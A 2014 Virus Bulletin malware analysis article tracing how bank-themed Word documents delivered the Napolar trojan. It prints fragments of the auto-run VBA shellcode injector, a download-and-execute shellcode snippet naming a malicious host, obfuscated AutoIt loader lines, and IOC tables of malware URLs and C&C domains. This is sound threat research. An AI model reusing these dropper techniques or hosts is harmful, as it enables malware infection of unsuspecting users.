@@ -1,0 +1,283 @@
+Back to VBA
+2014-04-02
+
+Gabor Szappanos
+Sophos
+,
+Hungary
+Editor:
+Helen
+
+Martin
+Abstract
+Last month’s issue of Virus Bulletin featured a detailed analysis of the Polarbot (a.k.a. Solarbot) trojan. The article covered just about everything you could ever want to know about it – except for one thing: how does a computer end up being infected with this creation? Gabor Szappanos fills the gap by detailing one of the infiltration methods that was used extensively in the attack.
+Copyright © 2014 Virus Bulletin
+
+A VBA macro code that is a process injector, a downloader shellcode and an AutoIt process injector script makes a very bizarre and eclectic combination. This is exactly what we observed being used in an attack during the last quarter of 2013. Add to the mix the fact that the final payload is the infamous Napolar, and we have a truly dazzling constellation.
+Last month’s issue of Virus Bulletin featured a detailed analysis of the Napolar (a.k.a. Polarbot/Solarbot) trojan [1]. The article covered just about everything you could ever want to know about it – except for one thing: how does a computer end up being infected with this creation? This article attempts to fill in the gap, detailing one of the infiltration methods that was used extensively in the attack.
+It is not unusual nowadays for Word documents to be utilized in attack scenarios to infect users. In fact, this is becoming increasingly common, as not only are APT groups using this method, but traditional cybercriminals have also discovered the advantages of it – for example, for deploying Zbot variants [2]. However, we have to travel several years back in time to find an ancient (and for all I knew, extinct) infection method in which a VBA macro was used instead of one of the popular Office exploits such as CVE-2012-0158.
+The infection scheme is summarized in Figure 1, and will be described in more detail in the following sections.
+Figure 1. Overview of infection method.
+
+Infection process
+In the infection wave that we are concerned with, the malware was distributed in the old-fashioned way: by email.
+The messages used social engineering techniques in order to deceive the recipient – such as the one shown in Figure 2.
+Figure 2. Email using social engineering.
+Masquerading as an official message from a bank, the user is lured into opening the email attachment, which turns out to be a malicious Word document containing VBA macro code.
+The macro code, which is designed for automatic execution on opening, has the following structure:
+#If VBA7 Then
+Private Declare PtrSafe Function CreateThread Lib “kernel32” (ByVal Lddqck As Long, ByVal Sxk As Long, ByVal Lssjnytp As LongPtr,
+Ordq As Long, ByVal Jwnefbq As Long, Haeya As Long) As LongPtr
+...
+#Else
+Private Declare Function CreateThread Lib “kernel32” (ByVal Lddqck As Long, ByVal Sxk As Long, ByVal Lssjnytp As Long, Ordq As
+Long, ByVal Jwnefbq As Long, Haeya As Long) As Long
+...
+#End If
+Sub Auto_Open()
+Dim Zjd As Long, Afaezkmrg As Variant, Bwqbj As Long
+#If VBA7 Then
+Dim Zqinobi As LongPtr, Nfqzstrhn As LongPtr
+#Else
+Dim Zqinobi As Long, Nfqzstrhn As Long
+#End If
+...
+End Sub
+Sub AutoOpen()
+Auto_Open
+End Sub
+Sub Workbook_Open()
+Auto_Open
+End Sub
+
+The ‘#If’ structure in the heading makes sure that the code works on both 64-bit and 32-bit installations. The main code is in the Auto_Open() function, which is invoked by the two event handler functions: AutoOpen and Workbook_Open. This ensures that the code is executed whenever the document is opened. Even though this is cross-application code, and Workbook_Open could make it work in Excel, we have not observed any Excel workbooks in the distribution campaign. Nevertheless, the Workbook_Open stub remains in the code – which is probably due to the malware authors being too lazy to clean up the proof-of-concept code they used as ‘inspiration’.
+Visual Basic for Applications (VBA) is the macro programming environment of Microsoft Office applications. Although the Basic language has a bad reputation, this is quite a capable programming language – as has been well demonstrated by macro viruses in their prime and now by this malware.
+There is an additional difficulty that comes from using a VBA macro as an infection vector instead of an exploit: from Office 2007 onwards, the execution of VBA macros is disabled by default (if only this had happened 10 years and four Office versions earlier, it would have changed the macro virus game completely!). The result is that, despite having an autostart macro, the VBA code will not execute in the newer versions of Office – furthermore, an alert is displayed on the Word menu bar which warns about the disabled macros, as shown in Figure 3.
+Figure 3. ‘Macros disabled’ warning.
+However, the malware authors were prepared for this situation, and deployed another simple social engineering trick to overcome it.
+The document displays a blurred account statement, and an explanation that the content has been obscured due to the security settings. Helpfully, an arrow points to the status bar at the top of the window, where the security warning about the macros is displayed, and where clicking on the ‘Options’ button will reveal the option to enable macros.
+This lures the user – who, thanks to the social engineering, is eager to see the blurred account information – to enable the execution of macros.
+Figure 4. Luring the user into enabling macro execution.
+Having done that, the VBA code will be executed the next time the document is opened.
+The VBA code then builds a shellcode in an array, which is moved to a newly allocated memory area with a call to RtlMoveMemory. Finally, a new thread is created on this code by a call to CreateThread.
+Figure 5. Shellcode injection implemented in VBA.
+(Click here to view a larger version of Figure 5.)
+The shellcode itself is the standard download-and-execute payload generated by the Metasploit framework, a snippet of which is shown in the following listing:
+push  0E2899612h ; InternetReadFile
+call  ebp
+test  eax, eax
+jz    short loc_195
+pop   eax
+test  eax, eax
+jz    short loc_183
+push  0
+push  esp
+push  eax
+lea   eax, [esp+0Ch]
+push  eax
+push  ebx
+push  5BAE572Dh ; WriteFile
+call  ebp
+sub   esp, 4
+jmp   short loc_151
+push  ebx
+loc_184:          ; CloseHandle
+push  528796C6h
+call  ebp
+push  0
+push  edi
+push  876F8B31h  ; WinExec
+call  ebp
+loc_195:
+push  0
+push  0A2A1DE0h
+call  ebp
+call  loc_133
+aRund11_exe  db ‘rund11.exe’,0
+loc_1AE:
+call  loc_B3
+aCarpentercommu  db ‘carpentercommunities.com’,0
+
+The technique described in the preceding paragraphs is a very creative way of using macro programming (and lies very far from its original purpose – the automation of tedious text editing operations), but it is far from being original. In fact, the macro code used by the malware authors is an exact copy of the proof-of-concept code taken from [3].
+The variables used in the code have been replaced with random names, but that is a standard code re factoring practice in the malware development world.
+The only notable difference is the shellcode, which in the case of the PoC was a standard Metasploit payload that executed calc.exe – in the observed samples, this was replaced with another standard Metasploit shellcode that downloads and executes an EXE file from a specified URL.
+It is worth noting that the original idea of using VBA for process injection was first published by Didier Stevens in his blog [4]. He used a different approach, utilizing WriteProcessMemory and CreateThread, and the shellcode was also different.
+Altogether, about a dozen Word dropper samples were identified over the duration of the campaign. Additionally, a few other samples showed up using the same shellcode injection technique – however, these came from malware research labs, probably as a result of researchers playing with the code to try to understand its operation. The latter samples are omitted from Table 1, which summarizes the main characteristics of the samples.
+First seen
+SHA1
+Attachment name
+Downloaded URL
+16/08/2013
+202985b9fdd9d147341e25540dfdb243bd306b95
+N/A
+autotema11.ru/serv/Junior.exe
+18/08/2013
+5825cd3ef26235d76b1f93355b2990ec37528a7a
+N/A
+autotema11.ru/server/jSolar.exe
+21/08/2013
+ef698a24f3ee89b76433ffdee878d9ff92c04d45
+entity1.doc
+carpentercommunities.com/serve/crypsola.exe
+22/08/2013
+958ce870117af6269ee9d45bb64188e1fa99fb5d
+New bill payment.doc
+autotema11.ru/server/solarju.exe
+03/09/2013
+15783a1eb0c1b5d56ac5cefcfd89f7bcd68cd6b9
+N/A
+kasvatus.org/serve/solair.exe
+09/09/2013
+62e9b795d6ff189d0f712626397ef0ff0fbf2f52
+N/A
+kasvatus.org/serve/crypsola.exe
+12/09/2013
+25ee9e4d8f11059de5f4a438744d677ca60c73dd
+IATA_Original_Account_form.doc
+kasvatus.org/serve/crypsoliar.exe
+15/09/2013
+183704daabdf93c8bdcc2d65a28c3f5fa32e041e
+IATA_original_paymen
+kasvatus.org/serve/crysol.exe
+03/10/2013
+8f599386ede0ff711f3aae6c3d4e8da2abf7b4c0
+Your_Bank_Account_Overview.doc
+webservice.cl/files/IE_Monitor.exe
+07/10/2013
+90ac1f4b23b81c5697e19217bc7a4472fc54a2d3
+IATA_Original_Paymen
+webservice.cl/files/IE_Monitor.exe
+09/10/2013
+ca7bc0d21d66a72ea80d693dd3b097e7a35b2110
+Your_Bank_Account_Overview.doc
+webservice.cl/files/Process.exe
+14/10/2013
+f5cb147f47248f7ab24ea9ae66ad7ec94340c4d3
+Your_Bank_Account_Overview.doc
+dopline.ru/js_file/Process.exe
+15/10/2013
+3ccd9c44b98fec8064b7dea6e38743394ddc839d
+Profoma+Invoice.doc
+webservice.cl/files/updater.exe
+21/10/2013
+39c4cf87b32feb929272746667aff96fd282b864
+Account_History_Overview.doc
+dopline.ru/js_file/IE_Explorer.exe
+28/11/2013
+40f30a18fb8067cc617d7b55fe194011e43cac69
+N/A
+sunshineyogafitness.com/development/juni-crypt.exe
+Table 1. Dropper documents identified in the campaign.
+The first-seen date of the individual samples shows that the campaign was running in the August–October timeframe, with regular, and more or less evenly distributed releases of new variants.
+Every Word document contains additional information, besides the document text – and the malicious documents in our investigation were no exception. The most important part of this additional data was the name of the user who last saved the document (see Figure 6).
+Figure 6. Author name in the properties.
+It is worth remembering the two user names that were observed in the documents: Johntab and Johntab-PC, because this is not the last time we will see them.
+Each of the samples downloaded an executable from a specified URL. There was very little overlap between the links, with only one recurrence observed. On the other hand, in many cases the same server was used with different filenames.
+Unfortunately, we were only able to retrieve a handful of downloaded executables for analysis, as the URLs were usually very short-lived.
+The live downloads yielded the following files:
+37f6e5ba7ed966228e79036698419a78a9583b62:
+crypsola.exe
+c72d5c35ea8aaa366b457e622ab235641c06376a:
+IE_Explorer.exe
+14de27f59db24219073feb546f161a179d013dfd:
+Process.exe
+ece7650ad323706c3a3dfcfe539a25ded53ab3e7:
+crypsoliar.exe
+Looking at them more closely led to the next surprise: each of them was a heavily obfuscated AutoIt script compiled into a standalone executable created with the purpose of decoding and executing the final payload, which turned out to be a Napolar bot.
+
+IE_Explorer.exe and Process.exe
+Both IE_Explorer.exe (c72d5c35ea8aaa366b457e622ab235641c06376a) and Process.exe (14de27f59db24219073feb546f161a179d013dfd) are are standalone compiled AutoIT executables, with heavily obfuscated script content. They differ only in the embedded final payload; the AutoIt code is the same.
+The AutoIT code builds and executes two shellcodes: an RC4 decoder and an injector. The first serves for decrypting the final executable payload, and the second injects the payload into a newly created process.
+Most of the script commands are hidden behind EXECUTE(BINARYTOSTRING()) constructs. In this form, the AutoIt script instructions are stored in hexadecimal ASCII representation, which is first decoded to the command string, and then executed. For example, the decoder function is represented in the following form:
+EXECUTE ( BINARYTOSTRING (  “0x2449664745575451676873545642626a732026204368722841736328537472696e674d6964202824506c736a6b646d48475
+366684a6b736965772c2024692c20312929202b203929” ) )
+This is converted by the BINARYTOSTRING() call to a more intuitive original form:
+$IfGEWTQghsTVBbjs & Chr(Asc(StringMid ($PlsjkdmHGSfhJksiew, $i, 1)) + 9)
+Finally, the EXECUTE() command runs it.
+On top of that, string constants, along with the shellcode itself, are encoded by a simple shift-by-nine-bytes (or Caesar cypher, if you prefer fancy names), as seen from the decoder above, resulting in the incomprehensible form shown in Figure 7.
+Figure 7. Encrypted shellcode and its decoder.
+The final payload executable is RC4 encrypted and appended after the compressed script code in the AutoIt executable. A fragment of the RC4 decoder shellcode is shown in Figure 8.
+Figure 8. RC4 decoder shellcode implementation.
+The malware uses the string ‘mauasdsADadADAudASJDUasdS7ADHadA765asd’ as the start and end marker of the RC4 encrypted data; in addition, this string also serves as the decryption key.
+This RC4 implementation is not an original development, it was taken straight from the source: https://code.google.com/p/autoit-cn/source/browse/trunk/UserInclude/ACN_HASH.au3.
+The decoded content is a Win32 executable, which is executed using a process injector shellcode, a snippet of which is shown in Figure 9.
+Figure 9. Process injector shellcode invoked from the AutoIt script.
+The shellcodes are started using a sequence of calls to the functions DllStrucSetData (to fill the procedure buffer) and DllCall (to execute the buffer by invoking CallWindowProcW):
+DllStructSetData($sdssdsdeessddsss, 1, $injector_shell)
+DllStructSetData($sdssdsdeessddseess, 1, $sdssdsdssddsss)
+DllCall(“user32.dll”, “int”, “CallWindowProcW”, “ptr”, DllStructGetPtr($sdssdsdeessddsss), “wstr”, (@AutoItExe),
+“ptr”, DllStructGetPtr($sdssdsdeessddseess), “int”, 0, “int”, 0)
+
+This method of project injection is discussed in [5] – an idea by reasen, an infamous AutoIt malware author. The attribution to this author is reflected in the embedded project path stored in the compiled executable: ‘ C:\Users\reasen\Desktop\’.
+One of the common tools used for compiling AutoIt scripts into standalone executables is AutoIt3Wrapper [6]. This offers several directives to fine-tune the final executable. One of the directives is #AutoIt3Wrapper_Ico, which allows a custom icon to be used for the standalone executable. This directive was used to change the icon of the malicious executables into one resembling that of the OpenOffice suite. An interesting fact for us is that the script in the compiled executable contains all of the wrapper directives – including the full path of the custom icon. This may give us information about the username of the person who compiled the executable.
+The code shows some similarity with reasencrypt [7].
+reasen: A well-known AutoIt malware creator, most of whose appearances are on Spanish sites.
+Also uses the name: Reasen Elbereth.
+http://reasenelbereth.blogspot.com.es/
+https://twitter.com/Reasen0 http://www.slideshare.net/TheReasen
+Allegedly also coded by reasen: http://www.grendelcrypter.com/contact-us.html
+There is no evidence to suggest that reasen is directly involved in this campaign; the other samples show stronger attributions to different people. It is more likely that he sold the AutoIt cryptor to the authors of this malware – or equally likely that the malware authors just took a sample created by reasen, and replaced the encrypted content. This can easily be done, as only the binary content needs to be regenerated using the known RC4 key, then the content between the start and end marker needs to be replaced by the encrypted content. In this case, the embedded payload was added to the EXE after the compilation.
+
+Crypsola.exe
+The AutoIt script in the Crypsola.exe sample (37f6e5ba7ed966228e79036698419a78a9583b62) features less obfuscation than the previous sample, using only the EXECUTE(BINARYTOSTRING()) trick – there is no additional encoding on top of it.
+Interestingly, this script checks if the avastui.exe process is running. If the process is running, the script waits for 25 seconds, and then continues with the execution. This may be an attempt to abuse a timing issue in the Avast anti malware product; this trick has also been observed in other AutoIt malware [8].
+The script commands are concatenated to strings byte by byte in a lengthy way, as shown in Figure 10.
+Figure 10. String building.
+(Click here to view a larger version of Figure 10.)
+A less commonly used feature is the fact that standalone AutoIt executables are also archives that can contain further embedded files apart from the scripts themselves – in our case, an embedded text file. The latter is dropped to %TEMP%\deepweb.txt with the script command:
+FILEINSTALL ( “f.txt” , @TEMPDIR & “\deepweb.txt” , 1 )
+This line of code has two effects. When the malware author compiled the EXE, the content of the file f.txt was embedded into the final executable. During execution, this embedded content is saved to the file deepweb.txt in the temporary directory. The file contains an ASCII representation of the payload EXE.
+Figure 11. Payload executable stored in ASCII representation.
+The AutoIt script decodes it, and using the same injector shellcode as the other sample, executes it.
+Unlike the samples in the previous section, this one does not use AutoIt3Wrapper. However, it is still possible to extract the project path from the compiled executable. The compiled executable contains encrypted metadata, one field of which is seemingly the full path of a temporary file, which also reveals the username: C:\Users\Johntab\AppData\Local\Temp\aut451B.tmp. The importance of this is that the username matches the one found earlier among the properties of the dropper Word documents – which indicates that this class of the AutoIt payload was created by the same user (and likely on the same computer) as the Word carrier documents.
+
+Crypsoliar.exe
+The Crypsoliar.exe sample (ece7650ad323706c3a3dfcfe539a25ded53ab3e7) is a medley of the previous two. It uses a shift by-two encryption of strings on top of the EXECUTE(BINARYTOSTRING()) trick, and the files are dropped using FileInstall. Junk string variable assignments are inserted into the code in the following form:
+$KFXAFMBTBJ7463539079213644 = “SXdMCxnwLc18682537269213644”
+$APJXYJBAUV8426698989213644 = “hhojVVnDEo19645697179213644”
+LOCAL $MLFJUEIDLE = EXECUTE ( BINARYTOSTRING ( FHVNVLTILJTHBER ( “.v224a4a3152505341522150434/52430600405752433`000.040.0.2047
+4c4/50572a434c06023/52562331274d3/3042070.04003b0007” ) ) )
+$PAUVSHBGNI9389858899213644 = “wrAHosOjXb20608857089213644”
+$EKFSLEBMHU10353018809213644 = “MckeIpOQqn97180529213644”
+
+In this case, not one but two files are dropped into the temporary directory:
+FILEINSTALL ( “kFxaFMBTbjgn9675177345409009.txt” , @TEMPDIR & “\f.txt” , 1 )
+FILEINSTALL ( “ns.bin” , @TEMPDIR & “\ns.txt” , 1 )
+
+Both files are decrypted using a custom decoder shellcode and then executed. The file f.txt decodes to the Napolar payload, and ns.txt decodes to a Rebhip (SpyRat) variant – a backdoor trojan written in Delphi.
+The project path stored in the sample is exactly the same as in the previous sample: C:\Users\Johntab\AppData\Local\Temp\, indicating that it comes from the same author as the previous one.
+
+Payload: Napolar
+In all cases, the final payload of the infection campaign was a Napolar/Polarbot variant, as described in detail in [1]. Since the scope of this article is the distribution and installation of the malware, rather than the final payload, I will not describe Napolar in detail, only point out a few interesting things about it.
+The executable features a couple of advanced anti-analysis tricks:
+It has only one PE section, named ‘%*s%*s%s’. This crashes analysis tools, such as studPe and OllyDbg (using the format string vulnerability documented in [9]).
+The executable is further obfuscated – the code section is encrypted, with the entry point set to an invalid value (0).
+Figure 12. Napolar anti-reversing trick: spooky section name and 0 entry point.
+The decoding and execution is achieved via two predefined TlsCallback functions. This makes it possible for Napolar to decrypt itself and execute even if no valid entry point is set – as described in [1].
+The encryption algorithm is RC4, the key is 0xDEADBEEF. The decryption code is address independent, with an unusual load address (0xFE0000), as shown in Figure 13.
+Figure 13. Address-independent RCA decoder in TlsCallback.
+(Click here to view a larger version of Figure 13.)
+The decoded content is injected into the explorer.exe process, which causes an additional obstacle in the debugging process: once the injection is complete, debugging to the explorer process may cause the computer to crash.
+The trojan uses named pipes for inter-process communication. In the samples we have identified as belonging to this campaign, the names were a little (but only a little) different from the commonly reported \\.\pipe\napSolar:
+\\.pipe\npSolar
+\\.pipe\napSolar
+The following C&C servers were contacted by the samples in this campaign:
+dopline.ru
+terra-araucania.cl
+kasvatus.org.
+
+Conclusion
+This infection campaign reminds us once again that social engineering can be as effective as any code based exploitation. After all, exploitable versions of an application can be found with a lot less probability than socially engineerable users – the latter being installed in front of 90+% of computers.
+Malware authors continue to surprise me over and over again. This time they surprised me not with the technical depth this piece of malware reached (average tasks accomplished), or its originality (proof of concept codes pasted in from multiple sources), but with the unusual selection of tools used. A VBA macro injects and runs a shellcode, then later on an AutoIt script injects and executes a shellcode. These are the two programming languages least likely to be named in the same paragraph as the word ‘shellcodes’.
+I await the next move with anticipation – which, logically, can’t be anything other than the deployment of QuickBasic in targeted attacks.
+
+Bibliography
+[1] Xu, H. Solarbot botnet. Virus Bulletin, March 2014, p.12. http://www.virusbtn.com/virusbulletin/archive/2014/03/vb201403-Solarbot.
+[2] Szappanos, G. Advanced Persistent Threats – the new normal? Naked Security. http://nakedsecurity.sophos.com/advanced-persistent-threats-the-new-normal/.
+[3] Weeks, M. Direct shellcode execution in MS Office macros. http://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/.
+[4] Stevens, D. Excel Exercises in Style. http://blog.didierstevens.com/2008/10/23/excel-exercises-in-style/.
+[5] http://foro.udtools.net/archive/index.php/t-10570.html.
+[6] AutoIt3Wrapper. http://www.autoitscript.com/autoit3/scite/docs/AutoIt3Wrapper.html.
+[7] Metasploit. https://www.youtube.com/watch?v=BAcQ7PR4FUw.
+[8] boot.sx (Betabot http botnet hosted by worldstream.nl). http://www.exposedbotnets.com/2013/12/bootsx-betabot-http-botnet-hosted-by.html.
+[9] OllyDbg Section Name Crash. http://forum.tuts4you.com/topic/28650-ollydbg-section-name-crash/.
